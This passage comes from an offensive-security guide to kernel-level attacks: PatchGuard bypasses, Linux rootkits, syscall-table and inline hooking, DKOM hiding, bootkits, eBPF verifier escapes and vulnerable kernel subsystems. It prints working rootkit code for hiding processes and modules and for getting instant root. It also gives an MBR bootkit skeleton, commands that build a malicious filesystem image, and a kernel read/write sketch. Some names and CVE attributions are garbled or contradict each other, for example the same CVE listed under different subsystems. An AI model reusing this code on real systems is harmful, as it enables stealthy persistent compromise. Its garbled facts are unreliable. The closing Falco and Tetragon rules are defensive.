**Offensive significance**: By invoking syscalls directly (bypassing NTDLL), attackers avoid userland hooks (AV/EDR). From Ring 0, the syscall dispatch table (`KeServiceDescriptorTable` on x86, `KSERVICE_DESCRIPTOR_TABLE` on x64) is a primary target for rootkit hooking, although PatchGuard protects it.

### 2.5 PatchGuard and Its Bypasses

**PatchGuard** (Kernel Patch Protection, KPP) is Windows' runtime integrity mechanism that periodically checks for modifications to critical kernel structures:

#### PatchGuard Checked Structures

| Protected Structure | Description |
|---------------------|-------------|
| `IDT` (Interrupt Descriptor Table) | Prevents IDT hooking |
| `GDT` (Global Descriptor Table) | Prevents GDT manipulation |
| `KdpCalloutEntry` / KD structures | Prevents debug hook interception |
| `SSDT` (System Service Dispatch Table) | Prevents syscall table hooking |
| `Kernel code sections` | Prevents inline kernel patching |
| `Critical kernel function pointers` | Prevents `HalDispatchTable`, etc. hooking |
| `Processor MSRs` | Prevents MSR-based hooks (e.g., `LSTAR` for syscall) |

#### PatchGuard Bypass Techniques

```c
// Technique 1: Race condition in PatchGuard DPC delivery
// PatchGuard uses KeGenericCallDpc to distribute checks to all CPUs
// By scheduling a CPU offline just as the DPC fires, we can skip
// the integrity check. This is a race condition with a narrow window.

// Technique 2: PatchGuard disable via nt!KiConfigureMiddlePriority
// This was a bypass used by some bootkits:
// 1. Modify the PatchGuard initialization routine to NOP out checks
// 2. Must be done BEFORE PatchGuard is enabled (during early boot)
// 3. Modern Windows: PatchGuard is enabled very early; window has closed

// Technique 3: Unpatching after check
// 1. Hook is installed
// 2. PatchGuard DPC fires on CPU 0
// 3. Hook detects the check and removes itself
// 4. PatchGuard check passes (clean state)
// 5. Hook re-installs itself after the check
// This requires intercepting the PatchGuard DPC routine itself.

// Technique 4: cor FlatButton's PGdisabler approach
// Attempts to locate PatchGuard context structures and free them
// This prevents PatchGuard from ever firing its periodic check
// Very fragile — PatchGuard contexts are obfuscated and move between builds

// Technique 5: Hypervisor-based (VMM) bypass
// 1. Load a hypervisor (VT-x/AMD-V) before Windows boots
// 2. Intercept #DB exceptions that PatchGuard uses for verification
// 3. Present clean state to PatchGuard checks
// 4. This is the most robust modern technique
```

```c
// PatchGuard check triggering (simplified):
// nt!KiPatchGuardAccelerateCheck:
//   - Reads KeTimeStampBias, computes elapsed time
//   - If enough time has passed, queues DPC on target processor
//   - DPC calls nt!KiPerformPatchGuardCheck
//   - Check reads memory, verifies checksums against known-good values
//   - If mismatch: KeBugCheckEx(CRITICAL_STRUCTURE_CORRUPTION)
//
// The check interval is ~10 minutes (configurable), and checks
// are distributed across CPUs to make bypass harder.

// Modern PatchGuard statistics:
// - Checks IDT, GDT, SSDT, and several other structures per CPU
// - Check structures are encrypted and randomized per boot
// - On Windows 11 24H2: adds additional checks for kernel stack cookies
//   and return address validation
```

---

## 3. Rootkits: Operating in Ring 0

### 3.1 LKM Rootkits

**Loadable Kernel Module (LKM)** rootkits are the most common form of Linux kernel rootkit. They are kernel modules (`.ko` files) that are inserted via `insmod` or `modprobe` and execute with full Ring 0 privileges.

#### adore-ng

`adore-ng` is one of the oldest and most well-known LKM rootkits, targeting Linux 2.4 and 2.6 kernels:

```c
// adore-ng core functionality:
// 1. Hides processes whose inode is on a specific filesystem
// 2. Hides files/directories matching specific patterns
// 3. Provides a backdoor for root access
// 4. Hooks VFS (Virtual File System) operations

// adore-ng hooks:
// - proc_root.readdir → hide processes from /proc
// - proc_root.lookup  → hide /proc/PID entries
// - ext3_dir_operations.readdir → hide files from directory listings
// - sys_getdents64    → hide files from getdents64 syscall

// Process hiding logic (simplified):
static int adore_hide(pid_t pid) {
    struct task_struct *task;
    for_each_process(task) {
        if (task->pid == pid) {
            task->flags |= PF_HIDDEN;  // Set custom hidden flag
            break;
        }
    }
}
```

#### diamorphine

`diamorphine` is a modern LKM rootkit targeting Linux kernels 3.x–6.x:

```c
// diamorphine.c (key features):
// 1. Module hiding: removes itself from kernel module list
// 2. Process hiding: modifies /proc output
// 3. File hiding: hooks getdents64
// 4. Privilege escalation: signal-based trigger
// 5. Network hiding: modifies /proc/net/tcp output

// Escalation trigger — send SIG64 to any process owned by the attacker
static int diamorphine_signal_hook(int sig) {
    if (sig == SIGSUPER) {   // Custom signal (63)
        commit_creds(prepare_kernel_cred(0));  // Instant root
    }
    return 0;
}

// Module self-hiding:
void diamorphine_hide_module(void) {
    list_del(&THIS_MODULE->list);          // Remove from module list
    kfree(THIS_MODULE->sect_attrs);        // Remove sysfs attributes
    THIS_MODULE->sect_attrs = NULL;
}

// getdents64 hook to hide files with specific prefix:
static asmlinkage long diamorphine_getdents64_hook(
    const struct pt_regs *pt_regs) {
    long ret = orig_getdents64(pt_regs);
    // Filter directory entries whose names start with "diamorphine"
    // ...
    return ret;
}
```

#### Reptile

`Reptile` is an advanced LKM rootkit with reverse shell capabilities:

```c
// Reptile architecture:
// - Kernel module: hooks syscalls, hides files/processes/ports
// - Userland daemon: reverse shell, transport encryption
// - Communication: via /proc or netlink sockets
// - Features: port knocking, file transfer, keylogger

// Reptile hiding mechanisms:
// 1. PID hiding: modify task->pid visibility in /proc
// 2. File hiding: hook getdents64, filter by prefix
// 3. Network hiding: modify /proc/net/tcp and /proc/net/tcp6
// 4. Module hiding: similar to diamorphine's list_del technique
// 5.conn_back: reverse connection with encryption (XOR/AES)
```

### 3.2 Function Hooking (sys_call_table Modification)

The most basic kernel rootkit technique is modifying the **system call table**:

```c
// sys_call_table hooking pattern:
#include <linux/syscalls.h>

unsigned long **sys_call_table;

// Find sys_call_table address:
// Method 1: kallsyms_lookup_name (available until 5.7)
sys_call_table = (unsigned long **)kallsyms_lookup_name("sys_call_table");

// Method 2: Brute-force scan from close known symbol (5.7+)
// Scan memory near &sys_close looking for the table pattern

// Disable write protection for sys_call_table (which is in .rodata on modern kernels):
static inline void disable_write_protection(void) {
    unsigned long cr0;
    cr0 = read_cr0();
    clear_bit(16, &cr0);    // Clear WP bit (Write Protect)
    write_cr0(cr0);
}

static inline void enable_write_protection(void) {
    unsigned long cr0;
    cr0 = read_cr0();
    set_bit(16, &cr0);      // Set WP bit
    write_cr0(cr0);
}

// Hook a syscall:
static unsigned long original_open;

static asmlinkage long hooked_open(const char __user *filename, int flags, umode_t mode) {
    // Log, filter, or modify the call
    if (should_hide_file(filename))
        return -ENOENT;
    return original_open(filename, flags, mode);
}

void hook_syscall(void) {
    disable_write_protection();
    original_open = sys_call_table[__NR_open];
    sys_call_table[__NR_open] = (unsigned long)hooked_open;
    enable_write_protection();
}

void unhook_syscall(void) {
    disable_write_protection();
    sys_call_table[__NR_open] = original_open;
    enable_write_protection();
}
```

**Modern challenges**:
- `CONFIG_STATIC_CALL` (5.10+): Replaces indirect `syscall_table[NR]` calls with static calls, making table modification ineffective
- `CONFIG_RODATA`: sys_call_table resides in read-only `.rodata` section — CR0.WP bypass is required
- `kallsyms_lookup_name` no longer exported (5.7+) — must use `kprobes` or `/proc/kallsyms` scanning
- `CONFIG_CFI_CLANG`: Control Flow Integrity prevents replacing function pointers

### 3.3 Inline Hooking / Detour Hooking

**Inline hooking** modifies the first bytes of a kernel function to redirect execution to the hook, rather than replacing a pointer in a table:

```x86asm
; Original function (before hooking):
original_function:
    push rbp
    mov rbp, rsp
    sub rsp, 0x20
    ; ... function body ...

; After inline hooking:
original_function:
    jmp hook_function        ; 5-byte E9 instruction (or 14-byte for x86_64)
    ; ... remaining original code (may need to be relocated) ...

hook_function:
    ; ... hook logic ...
    ; Call relocated original code:
    call original_function_stub

original_function_stub:
    push rbp                 ; Execute overwritten original bytes
    mov rbp, rsp
    jmp original_function + 5   ; Jump back to original function after hook
```

```c
// Kernel inline hook implementation:
struct inline_hook {
    void *target;           // Address of function to hook
    void *hook;             // Address of hook function
    void *stub;             // Trampoline to call original
    unsigned char orig_bytes[14]; // Saved original bytes
};

int install_inline_hook(struct inline_hook *h) {
    // Save original bytes
    memcpy(h->orig_bytes, h->target, 14);
    
    // Create trampoline (execute saved bytes + jump back)
    h->stub = kmalloc(32, GFP_KERNEL);
    memcpy(h->stub, h->orig_bytes, 14);
    // Add jump back to target + 14
    *(unsigned char *)(h->stub + 14) = 0xe9;  // JMP rel32
    *(int *)(h->stub + 15) = (long)(h->target + 14) - (long)(h->stub + 19);
    
    // Install the hook: target → jmp hook
    disable_write_protection();
    *(unsigned char *)(h->target) = 0xe9;
    *(int *)(h->target + 1) = (long)h->hook - (long)h->target - 5;
    enable_write_protection();
    
    return 0;
}
```

**Challenges with inline hooking in kernel**:
- `CONFIG_CC_OPTIMIZE_FOR_SIZE` may inline the target function, removing the call site
- Function may be shorter than the required 5/14 bytes for the jump
- `CONFIG_RODATA` makes kernel text read-only — requires CR0.WP bypass
- `CONFIG_TEXT_POKE` is the sanctioned API (but it validates caller with `ftrace` permissions)
- `CONFIG_CFI_CLANG` verifies indirect branch targets

### 3.4 DKOM (Direct Kernel Object Manipulation)

DKOM manipulates kernel data structures **without** modifying code. This makes it inherently harder to detect than hooking-based rootkits, as no code integrity checks are violated:

```c
// DKOM Technique 1: Process Hiding
// Remove a task_struct from the task list and PID hash table
void hide_process(pid_t pid) {
    struct task_struct *task;
    struct pid *pid_struct;
    
    rcu_read_lock();
    task = find_task_by_vpid(pid);
    if (task) {
        // Remove from task list (task_struct->tasks)
        list_del_rcu(&task->tasks);
        // Remove from PID hash table
        pid_struct = task->thread_pid;
        hlist_del_rcu(&pid_struct->links[0]);
        // Clear PID entry in kernel PID namespace
        task->thread_pid->numbers[0].nr = 0;
    }
    rcu_read_unlock();
}

// DKOM Technique 2: Module Hiding
// Remove module from kernel module list but keep it loaded
void hide_module(struct module *mod) {
    mutex_lock(&module_mutex);
    list_del(&mod->list);         // Remove from module list
    mod->state = MODULE_STATE_LIVE; // Keep state as LIVE
    mutex_unlock(&module_mutex);
}

// DKOM Technique 3: Port Hiding
// Remove entries from /proc/net/tcp by modifying
// the kernel's TCP hash table
void hide_port(unsigned short port) {
    struct inet_hashinfo *hashinfo = &tcp_hashinfo;
    // Walk the established hash table
    // Unlink any socket with local_port == port
    // This modifies the kernel's network datastructure
    // directly without hooking any function
}

// DKOM Technique 4: Filesystem Object Manipulation
// Modify inode timestamps or hide inodes
void hide_file_inode(struct inode *inode) {
    struct dentry *dentry;
    // Unlink dentry from dcache hash table
    dentry = d_find_alias(inode);
    if (dentry) {
        __d_drop(dentry);  // Remove from dcache
        dput(dentry);
    }
}
```

#### DKOM Detection Challenges

| Detection Method | Detects Hook-Based | Detects DKOM | Notes |
|-----------------|--------------------|--------------|-------|
| `systemtap` / `ftrace` | ✅ Yes | ❌ No | DKOM doesn't modify code |
| Integrity check (hash kernel text) | ✅ Yes | ❌ No | DKOM modifies data, not text |
| Cross-view (compare `/proc` vs. kernel data) | ❌ No | ✅ Partially | If both views are consistent |
| Memory forensics (Volatility) | ✅ Yes | ✅ Yes | Walk task_struct directly |
| `task_struct` tree walk | ❌ No | ✅ Partially | Hidden tasks may be orphaned |
| Timing analysis | ❌ No | ❌ No | DKOM doesn't change timing |

### 3.5 Fileless Rootkits

Fileless rootkits operate entirely in memory without writing files to disk:

```c
// Memory-only rootkit techniques:
// 1. /dev/mem injection: Write shellcode directly to kernel memory
// 2. Kprobe/jprobe: Register a kprobe that executes hook code
// 3. eBPF: Load a BPF program that intercepts syscalls
// 4. Perf event: Use perf to inject code into kernel context

// /dev/mem injection (requires root + no CONFIG_STRICT_DEVMEM):
int fd = open("/dev/mem", O_RDWR);
// 1. Find sys_call_table address
unsigned long sys_call_table_addr = 0xffffffff82000200;
// 2. Write hook function pointer over syscall entry
lseek(fd, sys_call_table_addr + __NR_openat * 8, SEEK_SET);
write(fd, &hook_openat_addr, sizeof(unsigned long));

// eBPF-based fileless rootkit:
// Load a BPF program that hooks tracepoints:
SEC("tracepoint/syscalls/sys_enter_openat")
int hook_openat(struct trace_event_raw_sys_enter *ctx) {
    // Log or filter file access
    // This runs in kernel context without any file on disk
    char *filename = (char *)ctx->args[1];
    // ... filter logic ...
    return 0;
}
```

```c
// Memory-based injection via ptrace:
// 1. ptrace(PTRACE_ATTACH, target_pid) to a privileged process
// 2. Inject shellcode that calls commit_creds(prepare_kernel_cred(0))
//    via a kernel vulnerability or ptrace-based code injection
// 3. No file ever touches disk

// /dev/kmem (if available) direct kernel memory modification:
// Similar to /dev/mem but operates on virtual addresses
// Modern kernels: CONFIG_DEVKMEM is typically disabled
```

### 3.6 Bootkits (Ring 0 Before OS Loads)

**Bootkits** operate at the earliest stage of system boot, before the OS kernel loads. They modify the boot sequence to inject code into Ring 0 before any OS-level protection is active.

#### Boot Process and Attack Points

```
UEFI Firmware
  │
  ├─► SEC (Security Phase)
  │     └─► PEI (Pre-EFI Initialization)
  │            └─► DXE (Driver Execution Environment)
  │                   └─► BDS (Boot Device Selection)
  │                          │
  │                          ├─► Boot Halo (Stony Bootkit target)
  │                          │
  │                          ├─► MBR (Master Boot Record) ◄── Classic bootkit target
  │                          │     └─► VBR (Volume Boot Record)
  │                          │            └─► Bootmgr/GRUB ◄── VBR bootkit target
  │                          │                   └─► OS Loader
  │                          │
  │                          └─► EFI Application (bootx64.efi) ◄── UEFI bootkit target
  │                                 └─► OS Loader
  │
  OS Kernel loads
  │
  ├─► Kernel initialization (Ring 0)
  │     └─► PatchGuard initialization
  │
  └─► Full OS operation
```

#### UEFI Bootkit

```c
// UEFI bootkit architecture:
// 1. Replace or modify the EFI System Partition boot loader (bootx64.efi)
// 2. Or: modify the UEFI NVRAM boot variables
// 3. Or: exploit a UEFI DXE driver vulnerability
// 4. The bootkit runs before ExitBootServices() — has full hardware access
// 5. It hooks the ExitBootServices call to inject code before kernel init

// EFI_STUB bootkit pattern:
EFI_STATUS EFIAPI EfiMain(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) {
    // 1. Locate the original boot loader
    // 2. Load it into memory
    // 3. Hook ExitBootServices to inject kernel-level code
    // 4. Call the original EfiMain
    
    // Hook ExitBootServices:
    gBS->BootServices->ExitBootServices = hooked_exit_boot_services;
    
    return EFI_SUCCESS;
}

EFI_STATUS hooked_exit_boot_services(EFI_HANDLE ImageHandle, UINTN MapKey) {
    // 1. Write hook code into kernel memory space
    // 2. Modify kernel initialization to call hook before main
    // 3. Call original ExitBootServices
    
    return original_exit_boot_services(ImageHandle, MapKey);
}
```

#### MBR Bootkit (Classic)

```x86asm
; Classic MBR bootkit (512 bytes, first sector of disk)
; Offset 0x000: Bootstrap code (446 bytes)
; Offset 0x1BE: Partition table (64 bytes)
; Offset 0x1FE: Boot signature 0x55AA

; MBR bootkit code:
[BITS 16]
[ORG 0x7C00]

start:
    cli                     ; Disable interrupts
    xor ax, ax
    mov ds, ax
    mov es, ax
    mov ss, ax
    mov sp, 0x7C00          ; Set stack
    
    ; Save original MBR to another sector
    ; Read original MBR from disk into memory
    mov ah, 0x02            ; BIOS read sectors
    mov al, 0x01            ; 1 sector
    mov ch, 0x00            ; Cylinder 0
    mov cl, 0x03            ; Sector 3 (original MBR backup)
    mov dh, 0x00            ; Head 0
    mov dl, 0x80            ; Drive 0
    mov bx, 0x7C00          ; Buffer
    int 0x13
    
    ; Install hook:
    ; Modify the loaded boot sector to include our code
    ; Jump to hook before transferring control to OS loader
    
    ; Key payload: modify OS loader to hook kernel initialization
    ; Jump to original MBR
    jmp 0x7C00
    
times 510-($-$$) db 0
dw 0xAA55
```

#### Notable Bootkits

| Bootkit | Target | Technique | Detection |
|---------|--------|-----------|-----------|
| **Stoned Bootkit** | MBR/VBR | Replaces MBR bootstrap | MBR hash comparison, BIOS Int13h hooking |
| **Mebromi** | Award BIOS | BIOS ROM modification (DOS-era) | BIOS ROM hash, flash write protection |
| **Lojax** | UEFI | Modifies EFI NVRAM, persists in SPI flash | Secure Boot violation, NVRAM integrity check |
| **ESPecter** | EFI System Partition | Replaces bootx64.efi | EFI binary signature verification |
| **BlackLotus** | UEFI | Bypasses Secure Boot via signed-but-vulnerable EFI binaries | UEFI firmware integrity scan |
| **CosmicStrain** | UEFI | DXE driver injection | Firmware TPM measurements |

**Secure Boot** mitigates most UEFI bootkits by verifying the cryptographic signature of each boot component. However, **BlackLotus** (CVE-2022-21894) demonstrated that signed vulnerable EFI binaries could be used to bypass Secure Boot entirely.

---

## 4. Linux Kernel Subsystems Most Vulnerable

### 4.1 eBPF Verifier Bugs

The eBPF verifier is responsible for proving that BPF programs are safe before they are JIT-compiled and executed in kernel context. Bugs in the verifier can allow out-of-bounds access, type confusion, or privilege escalation.

See [Section 5](#5-ebpf-as-attack-sand-defense) for detailed eBPF analysis.

### 4.2 Filesystem Parsing (ext4, btrfs, XFS)

Filesystem parsing is a critical attack surface because:
1. **Untrusted disk images**: USB drives, loop-mounted files, emailed disk images
2. **No privilege required**: Mounting a crafted filesystem can trigger kernel bugs
3. **Complex data structures**: Filesystems parse trees, bitmaps, extent maps, checksums

#### Most Vulnerable Filesystem Operations

| Operation | Attack Vector | Example |
|-----------|--------------|---------|
| Mount parsing | Malformed superblock, group descriptors | CVE-2022-29581 (btrfs) |
| Directory traversal | Crafted directory entries with invalid offsets | CVE-2021-4147 (ext4) |
| Extent map handling | Overlapping or circular extent references | CVE-2022-1016 (btrfs) |
| Journal replay | Corrupt journal entries during recovery | CVE-2019-19377 (ext4) |
| Extended attributes | Oversized or corrupt xattr entries | CVE-2022-1180 (ext4) |
| Inline data | Crafted inode with inline data overflow | CVE-2021-4037 (ext4) |
| XFS attr fork | Malformed attribute fork tree | CVE-2022-4286 (xfs) |

```c
// Common vulnerability patterns in filesystem parsing:

// Pattern 1: Integer overflow in size calculations
// ext4_ext_find_extent() could craft an extent with
// ee_len that overflows when multiplied by block size:
unsigned int size = le16_to_cpu(eh->eh_entries) * sizeof(struct ext4_extent);
// If eh_entries is near UINT16_MAX, size overflows
// → small allocation → heap overflow

// Pattern 2: Unchecked offsets in directory entries
struct ext4_dir_entry_2 *de = (struct ext4_dir_entry_2 *)dir_buf;
// de->name_len comes from disk — if > EXT4_NAME_LEN, strcpy overflows
if (de->name_len > EXT4_NAME_LEN) {
    // Should be checked, but some paths miss this
}

// Pattern 3: Circular references in tree structures
// btrfs extent buffer tree: crafted tree can have circular references
// leading to infinite recursion:
walk_tree(root);
// If root->left == root (circular), infinite loop + stack overflow
```

**Attack scenario**: A user creates a malicious ext4 image file:

```bash
# Create a malformed ext4 filesystem
dd if=/dev/zero of=evil.img bs=1M count=10
mkfs.ext4 evil.img

# Modify the superblock to corrupt s_inodes_per_group
# This causes integer overflow when calculating bitmap sizes
python3 -c "
import struct
with open('evil.img', 'r+b') as f:
    f.seek(0x28)  # s_inodes_per_group offset in superblock
    f.write(struct.pack('<L', 0xFFFFFFFF))  # Corrupted value
"

# Mount the malicious filesystem (may trigger kernel vulnerability)
sudo mount -o loop evil.img /mnt/evil
```

### 4.3 Network Stack (netfilter, socket filters)

The Linux network stack provides a large attack surface due to its complexity and the many packet processing paths:

#### Netfilter (iptables/nftables)

```c
// CVE-2022-32250: nft_set_element double-free
// Vulnerable code path:
static int nft_setelem_catchall_deactivate(struct nft_set *set) {
    // Element is removed from set but not freed
    // Later, the same element is freed again via
    // nft_setelem_flush() → double-free
}

// CVE-2022-1016: nft_subsystem OOB read
// When fetching set element keys with NFTA_SET_ELEM_KEY_END,
// the verifier doesn't properly validate the length
// before copying data to the kernel
```

#### Netfilter Exploitation Chain

```
Unprivileged user creates nftables rules
    │
    ├─► nft_set_add() → allocates set elements
    │
    ├─► Trigger UAF by deleting and re-adding elements
    │     │
    │     └─► nft_setelem_deactivate() + nft_setelem_flush()
    │           → double-free on set element
    │
    ├─► Spray msg_msg into freed slot
    │
    ├─► Leak kernel address via corrupted msg_msg
    │
    └─► Escalate privileges via pipe_buffer vtable hijack
```

#### Socket Filters (BPF/classic)

Classic BPF (cBPF) is still accepted by some socket filters:

```c
// SO_ATTACH_FILTER vulnerability pattern:
// Attaching a cBPF filter to a raw socket:
struct sock_fprog prog = {
    .len = filter_len,
    .filter = filter_code,
};
setsockopt(sock, SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog));
// If the filter program has an infinite loop or deep nesting,
// it can cause DoS or bypass security checks
```

#### Recent Notable Network Stack CVEs

| CVE | Subsystem | Type | Impact |
|-----|-----------|------|--------|
| CVE-2023-32233 | nftables | UAF | LPE |
| CVE-2022-34918 | nftables | OOB write | LPE |
| CVE-2022-32250 | nftables | Double-free | LPE |
| CVE-2022-1016 | nftables | OOB read | Info leak |
| CVE-2022-4280 | netfilter | OOB write | LPE |
| CVE-2023-0179 | netfilter | Stack buffer overflow | LPE |
| CVE-2021-22555 | netfilter | Heap OOB write | LPE |
| CVE-2022-2588 | cls_route | Double-free | LPE |

### 4.4 Memory Management (mm/)

The Linux memory management subsystem (`mm/`) is responsible for page allocation, virtual memory mapping, swapping, and memory-mapped I/O:

```c
// Key attack surfaces in mm/:

// 1. Userfaultfd race conditions
//    Attacker can stall page fault handling to create race windows
//    in kernel memory operations (copy_from_user, get_user_pages)

// 2. Pagemap / /proc/self/pagemap information leaks
//    Exposes physical page addresses → KASLR bypass

// 3. madvise(MADV_DONTNEED) race conditions
//    Kernel may have stale TLB entries after DONTNEED
//    → Use-After-Free via stale mappings

// 4. OOM killer manipulation
//    Force OOM conditions to trigger specific kernel code paths
//    → Race conditions in memory reclamation

// 5. Huge page (hugetlbfs) vulnerabilities
//    Huge pages have separate allocation paths and may bypass
//    some hardening checks

// 6. /dev/kmsg and dmesg information leaks
//    Kernel messages containing addresses leaked to unprivileged users
```

#### Notable mm/ CVEs

| CVE | Component | Type | Impact |
|-----|-----------|------|--------|
| CVE-2022-32250 | mm/page_alloc | Use-after-free | LPE |
| CVE-2021-4154 | mm/shmem | Memory corruption | LPE |
| CVE-2020-29374 | mm/gup | Information leak | KASLR bypass |
| CVE-2022-4280 | mm/mremap | Race condition | Potential LPE |
| CVE-2022-4129 | mm/hugetlb | Use-after-free | LPE |
| CVE-2023-0461 | mm/uffd | UAF in userfaultfd | LPE |

### 4.5 Driver Subsystems (GPU, USB, Network)

Drivers are the **most prolific source** of kernel vulnerabilities, comprising roughly 70% of all kernel CVEs:

#### GPU Drivers

```c
// GPU driver attack surface:
// - IOCTL interface for rendering commands
// - DMA buffer management (GEM/TTM objects)
// - Memory management unit (GPU MMU) page tables
// - Shader compilation pipelines
// - Command submission (CS) ring buffers
//
// Typical vulnerability patterns:
// 1. Missing bounds checks in IOCTL handlers
// 2. Race conditions in buffer object lifecycle management
// 3. Integer overflows in GPU memory allocation
// 4. Unchecked user pointers passed to GPU command buffers
// 5. Shader compiler bugs → GPU code execution → kernel-level DMA

// AMD GPU driver (amdgpu) attack surface:
// - DRM_IOCTL_AMDGPU_GEM_MMAP
// - DRM_IOCTL_AMDGPU_CS (command submission)
// - DRM_IOCTL_AMDGPU_INFO
// - DRM_IOCTL_AMDGPU_GEM_WAIT_SYNC
```

#### USB Drivers

```c
// USB drivers present unique attack surface because:
// 1. USB devices can be programmatically controlled by attacker
// 2. No authentication on USB bus — device identity is self-reported
// 3. Malicious USB devices can send crafted descriptors and packets

// CVE-2023-2575: USB Gadget FunctionFS race condition
// Double-free in f_fs.c when epfile_release races with
// ffs_func_disable leads to UAF on epfile->ffs

// CVE-2022-4139: USB Video Class (UVC) driver OOB write
// Missing bounds check on UVC control transfer length

// USB fuzzing with Facedancer/GreatFET:
// Hardware USB emulation allows sending malformed USB packets
// to target machines → kernel driver fuzzing
```

#### Network Drivers

```c
// Network driver vulnerabilities are exploitable remotely
// (no local access required for some bugs)

// CVE-2023-0179: Netfilter stack buffer overflow
// In nf_tables, when evaluating expressions with largepayloads,
// a stack buffer can be overflowed via nft_payload_copy_vlan()

// CVE-2021-22555: Netfilter heap OOB write
// In nf_conntrack_sip, when parsing SIP messages,
// address extraction can write beyond allocated buffer
```

#### Driver Vulnerability Statistics (2020–2024)

| Subsystem | CVE Count | LPE Capable | Remotely Exploitable |
|-----------|-----------|-------------|---------------------|
| GPU (DRM) | ~180 | ~60% | ~10% (via DMA) |
| USB | ~95 | ~55% | ~20% (physical access) |
| Network | ~210 | ~70% | ~40% |
| Sound (ALSA) | ~70 | ~50% | ~5% |
| Input (HID) | ~45 | ~40% | ~15% (USB HID) |
| Storage (SCSI/ATA) | ~85 | ~65% | ~25% (iSCSI) |
| Filesystem | ~150 | ~70% | ~15% (mount) |

---

## 5. eBPF as Attack Surface and Defense

### 5.1 eBPF Verifier Escape CVEs

The eBPF verifier is the security boundary between untrusted user-space BPF programs and kernel execution. A verifier escape means an attacker can execute arbitrary BPF code with kernel privileges — effectively a Ring 0 compromise.

#### eBPF Verifier Architecture

```
User-space BPF program
         │
         ▼
    ELF .o file (BPF bytecode)
         │
         ▼
┌─────────────────────────┐
│   BPF Verifier           │
│   ├── Check for loops   │  (must terminate)
│   ├── Check memory access│  (bounds verification)
│   ├── Check pointer arithmetic│ (no OOB)  
│   ├── Track register types│  (SCALAR, PTR_TO_MAP, etc.)
│   ├── Simulate all paths│  (abstract interpretation)
│   └── Prune infeasible  │  (state pruning)
│       paths              │
└─────────────────────────┘
         │ (verified safe)
         ▼
    JIT Compilation (native x86_64/arm64)
         │
         ▼
    Kernel Execution (Ring 0)
```

#### CVE-2020-8835: Incorrect Bounds Calculation

**Root cause**: The verifier incorrectly tracked register value ranges when performing `32-bit` arithmetic that resulted in a known-zero upper 32 bits:

```c
// CVE-2020-8835: bpf verifier incorrect bounds tracking
// The bug: when a register is ANDed with a 32-bit mask,
// the verifier assumed the upper 32 bits were cleared
// BUT this was not true for all paths through the program.

// PoC pattern:
BPF_MOV64_IMM(BPF_REG_3, 0),          // r3 = 0
BPF_ALU64_IMM(BPF_AND, BPF_REG_3, 0), // r3 &= 0 → r3 = 0 (known)
BPF_ALU64_IMM(BPF_LSH, BPF_REG_3, 32), // r3 <<= 32 (should be 0)
// Verifier tracks r3 as (0; 0) — range [0, 0]
// BUT: if r3 came from a pointer subtraction path,
// the range tracking was incorrect → OOB access

// Exploit:
// 1. Forge register bounds to make verifier think pointer is in-bounds
// 2. Actually access memory out-of-bounds at runtime
// 3. Read/write arbitrary kernel memory via BPF map
```

#### CVE-2021-3444: Incorrect ALU32 Bounds Truncation

```c
// CVE-2021-3444: 32-bit ALU bounds truncation error
// When performing 64-bit to 32-bit ALU operations,
// the verifier incorrectly updated the 64-bit bounds
// based on 32-bit results, losing the upper range information

// This allowed: 
// A register believed to be in range [0, 1] could actually
// hold a much larger value at runtime → OOB map access
```

#### CVE-2022-0500: Pointer Comparison Leak

```c
// CVE-2022-0500: Incorrect pointer comparison
// The verifier allowed comparing a PTR_TO_MAP_VALUE_OR_NULL
// against a known scalar, which could leak the map value address
// This leaked kernel heap addresses to user space
```

#### Other Notable eBPF Verifier CVEs

| CVE | Year | Root Cause | Impact |
|-----|------|-----------|--------|
| CVE-2017-16995 | 2017 | Missing ALU sanitation | Arbitrary kernel code execution |
| CVE-2019-7308 | 2019 | Pointer leak via bpf_spin_lock | Kernel address leak |
| CVE-2020-8835 | 2020 | Incorrect bounds tracking | OOB read/write |
| CVE-2020-27194 | 2020 | ALU32 bounds truncation | OOB read |
| CVE-2021-3444 | 2021 | 32-bit bounds truncation | OOB read/write |
| CVE-2022-0500 | 2022 | Pointer comparison | Kernel address leak |
| CVE-2022-23222 | 2022 | Type confusion in PTR_TO_BTF_ID | Kernel memory corruption |
| CVE-2022-3534 | 2022 | Incorrect scalar bounds | OOB access |
| CVE-2023-2163 | 2023 | Incorrect branch pruning | Arbitrary BPF program execution |
| CVE-2023-3777 | 2023 | Map value bounds overflow | LPE |
| CVE-2024-0402 | 2024 | Mismatched speculative bounds | OOB access |
| CVE-2024-5004 | 2024 | Dead code elimination issue | LPE |

```c
// eBPF verifier escape exploitation pattern:
// 1. Write BPF program that "passes" verifier but accesses
//    memory beyond intended bounds at runtime
// 2. Use BPF map operations to read/write arbitrary kernel addresses
// 3. Use BPF helper bpf_probe_read_kernel() to read arbitrary addresses
// 4. Use BPF map writes to modify kernel data structures
// 5. Achieve LPE by overwriting cred structures or modprobe_path

// After verifier escape, arbitrary kernel read/write via BPF:
SEC("iter/task")
int exploit(struct bpf_iter__task *ctx) {
    struct task_struct *task = ctx->task;
    if (task == NULL) return 0;
    
    // Read arbitrary kernel address:
    u64 addr = target_address;
    u64 val;
    bpf_probe_read_kernel(&val, sizeof(val), (void *)addr);
    
    // Write to arbitrary kernel address (if map_value is writable):
    bpf_map_update_elem(&write_map, &key, &val, BPF_ANY);
    
    return 0;
}
```

### 5.2 eBPF for Runtime Security (Falco, Tetragon)

eBPF's safe execution model makes it powerful for **defensive** security observability:

#### Falco

```yaml
# Falco: Runtime security monitoring using eBPF/syscalls
# Detects anomalous behavior based on syscall traces

- rule: Detect Privilege Escalation via SUID Binary
  desc: Detect when a SUID binary is executed that spawns a shell
  condition: >
    evt.type = execve and 
    evt.arg.uid != 0 and
    proc.suid = 0 and
    (proc.name = bash or proc.name = sh)
  output: >
    SUID binary spawned shell 
    (user=%user.name command=%proc.cmdline)
  priority: CRITICAL
  tags: [privilege_escalation, suid]

- rule: Detect Kernel Module Loading
  desc: Detect insmod/modprobe execution
  condition: >
    evt.type = execve and
    (proc.name = insmod or proc.name = modprobe)
  output: >
    Kernel module loaded 
    (user=%user.name command=%proc.cmdline)
  priority: WARNING
  tags: [kernel, rootkit]
```

#### Tetragon

```yaml
# Tetragon: eBPF-based real-time security enforcement
# Can block operations, not just detect them

apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "block-kernel-module-loading"
spec:
  kprobes:
  - call: "do_init_module"
    syscall: false
    args:
    - index: 0
      type: "module"
    selectors:
    - matchNames:
        module:
          name: ["suspicious_module"]
      matchActions:
